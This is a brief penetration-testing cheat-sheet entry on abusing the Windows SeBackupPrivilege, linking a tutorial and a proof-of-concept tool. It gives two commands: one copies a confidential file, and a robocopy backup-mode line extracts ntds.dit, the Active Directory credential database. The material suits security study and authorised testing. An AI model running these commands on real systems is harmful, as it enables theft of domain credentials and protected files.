# SeBackupPrivilege

Follow this [article](https://www.hackingarticles.in/windows-privilege-escalation-sebackupprivilege/)

* [ ] If disabled then use this [PoC](https://github.com/giuliano108/SeBackupPrivilege) and use

```
Copy-FileSeBackupPrivilege 'C:\Confidential\2021 Contract.txt' .\Contract.txt
```

To copy files or robocopy

```
robocopy /B E:\Windows\NTDS .\ntds ntds.dit
```
